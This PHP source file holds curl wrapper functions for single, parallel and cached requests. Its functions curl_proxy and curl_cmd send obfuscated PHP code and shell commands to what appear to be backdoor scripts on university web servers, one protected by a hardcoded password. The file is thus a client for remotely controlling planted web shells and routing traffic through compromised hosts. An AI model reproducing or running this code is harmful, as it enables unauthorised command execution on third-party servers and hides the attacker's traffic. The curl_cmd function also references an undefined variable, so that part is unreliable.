<?php
require_once('cache.func.php');
require_once('cmd.func.php');

function curl($url, $opt = array(), $save_to = false, &$error_handel = false){
    $options = array(
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_CONNECTTIMEOUT => 60,
        CURLOPT_ENCODING       => '',
    );
    if( $save_to ){
		$save_file = $save_to . urlencode($url);
		$fp = fopen($save_file, 'w');
		$options[CURLOPT_FILE] = $fp;
    }
    if( is_array($opt) ){
        $options = $opt + $options;
    }
    $ch = curl_init($url);
    curl_setopt_array($ch, $options);
    $result = curl_exec($ch);
    
    if( $save_to ) fclose($fp);
    
    $error = curl_error($ch);
    if( '' != $error ){
        if( !(false === $error_handel) ){
            $error_handel = curl_getinfo($ch);
            $error_handel['error'] = $error;
        }
        print $error;
    }
    
    curl_close ($ch);
    return $result;
}

function curl_m($urls, $opt = array(), $save_to = false, &$error_handel = false){
    $options = array(
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_CONNECTTIMEOUT => 60,
        CURLOPT_ENCODING       => '',
    );
    if( $save_to ){
    	unset($options[CURLOPT_RETURNTRANSFER]);
    }
    if( is_array($opt) ){
        $options += $opt;
    }
    // curl init && add handel
    $mh = curl_multi_init();
    foreach ($urls as $i => $url) {
		if( $save_to ){
			$save_file = $save_to . urlencode($url);
			$fp[$i] = fopen($save_file, 'w');
			$options[CURLOPT_FILE] = $fp[$i];
		}
		$ch[$i] = curl_init($url);
        curl_setopt_array($ch[$i], $options);
        curl_multi_add_handle($mh, $ch[$i]);
    }
    
    // start performing the request
    do {
        $mrc = curl_multi_exec($mh, $active);
    } while ($mrc == CURLM_CALL_MULTI_PERFORM);
    
    while (CURLM_OK == $mrc && 0 < $active) {
        // wait for network
        if (curl_multi_select($mh) != -1) {
            // pull in any new data, or at least handle timeouts
            do {
                $mrc = curl_multi_exec($mh, $active);
            } while (CURLM_CALL_MULTI_PERFORM == $mrc);
        }
    }
    
    if (CURLM_OK != $mrc) {
        print "Curl multi read error $mrc\n";
    }
    // retrieve data
    foreach ($urls as $i => $url) {
        $error = curl_error($ch[$i]);
		if( '' == $error ){
			$res[$i] = curl_multi_getcontent($ch[$i]);
		} else {
            if( !(false === $error_handel) ){
                $error_handel[$i] = curl_getinfo($ch[$i]);
                $error_handel[$i]['error'] = $error;
            }
			print "Curl error on handle $i: $error\n";
		}
		
        curl_multi_remove_handle($mh, $ch[$i]);
        curl_close($ch[$i]);
        
        if( $save_to ) fclose($fp[$i]);
    }
    
    curl_multi_close($mh);
    
    return $res;
}

function curl_cache($url, $opt, $cache, $cacheId){
    if( 0 < $cache){
        $res = get_cache($cacheId, $cache);
        if( $res === false ){
            $res = curl($url, $opt);
            if($res === false || $res == 'error') return false;
            write_cache($cacheId, $res);
        }
    } else {
        $res = curl($url, $opt);
    }
    return $res;
}

function curl_proxy($url, $cache = 86400, $host = 'ecjtu'){
    $proxy['ecjtu'] = array(
        CURLOPT_URL        => 'http://ems.ecjtu.net/hemon.php',
        CURLOPT_POST       => 1,
        CURLOPT_POSTFIELDS => "hemon=!QAZxsw2&url=" . urlencode($url),
        CURLOPT_ENCODING   => ''
    );
    $proxy['jwc'] = array(
        CURLOPT_URL        => 'http://jwc.ecjtu.jx.cn/assess/inc/DB.php',
        CURLOPT_POST       => 1,
        CURLOPT_POSTFIELDS => "cmd=" . urlencode(stringToChr('ob_start("ob_gzhandler"); if($res = file_get_contents("' . $url . '")){echo $res;}else{echo "error";};')),
        CURLOPT_ENCODING   => ''
    );
    $proxy['local'] = array(
        CURLOPT_URL       => $url,
        CURLOPT_VERBOSE   => 1,
        CURLOPT_PROXY     => 'localhost:8080',
        CURLOPT_PROXYTYPE => CURLPROXY_SOCKS5
    );
    return curl_cache(null, $proxy[$host], $cache, $url);
}

function curl_cmd($cmd, $host = 'jwc'){
    $cmd = urlencode(stringToChr($cmd));
    $proxy['ecjtu'] = array(
        CURLOPT_URL        => 'http://ems.ecjtu.net/hemon.php',
        CURLOPT_POST       => 1,
        CURLOPT_POSTFIELDS => "hemon=!QAZxsw2&cmd=$cmd",
        CURLOPT_ENCODING   => ''
    );
    $proxy['jwc'] = array(
        CURLOPT_URL        => 'http://jwc.ecjtu.jx.cn/assess/inc/db.php',
        CURLOPT_POST       => 1,
        CURLOPT_POSTFIELDS => "cmd=$cmd",
        CURLOPT_ENCODING   => ''
    );
    return curl($url, $proxy[$host]);
}

?>
